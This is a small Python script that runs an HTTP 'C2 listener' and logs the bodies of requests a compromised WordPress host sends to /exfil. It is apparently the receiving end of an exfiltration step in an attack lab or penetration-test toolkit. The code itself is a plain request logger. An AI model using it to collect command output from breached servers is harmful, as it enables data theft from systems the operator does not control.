#!/usr/bin/env python3
"""Tiny HTTP listener for the outbound-exfiltration step.

    python3 c2listener.py [--host 0.0.0.0] [--port 9099] [--log out/c2.log]

Every request is printed and appended to the log. The WordPress host is expected
to send `POST /exfil` with command output in the body.
"""
from __future__ import annotations

import argparse
import datetime
import http.server
import os
import pathlib
import socketserver
import sys


def make_handler(log_path: pathlib.Path):
    log_path.parent.mkdir(parents=True, exist_ok=True)

    class Handler(http.server.BaseHTTPRequestHandler):
        def _record(self) -> None:
            line = (
                f"{datetime.datetime.now(datetime.timezone.utc).isoformat()} "
                f"{self.command} {self.path} from {self.client_address[0]} "
                f"UA={self.headers.get('User-Agent')}\n"
            )
            with log_path.open("a") as handle:
                handle.write(line)
            sys.stderr.write("HIT " + line)

        def do_GET(self) -> None:  # noqa: N802
            self._record()
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"ok")

        def do_POST(self) -> None:  # noqa: N802
            length = int(self.headers.get("Content-Length") or 0)
            body = self.rfile.read(length) if length else b""
            self._record()
            with log_path.open("a") as handle:
                handle.write("  BODY: " + body.decode("utf-8", "replace") + "\n")
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"ok")

        def log_message(self, *_args) -> None:
            pass

    return Handler


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--host", default="0.0.0.0")
    parser.add_argument("--port", type=int, default=9099)
    default_log = pathlib.Path(
        os.environ.get(
            "WP_OUT_DIR", pathlib.Path(__file__).resolve().parent.parent / "out"
        )
    ) / "c2.log"
    parser.add_argument("--log", default=str(default_log))
    args = parser.parse_args()

    socketserver.TCPServer.allow_reuse_address = True
    handler = make_handler(pathlib.Path(args.log))
    print(f"[*] listener on {args.host}:{args.port} -> {args.log}")
    with socketserver.TCPServer((args.host, args.port), handler) as server:
        server.serve_forever()


if __name__ == "__main__":
    main()
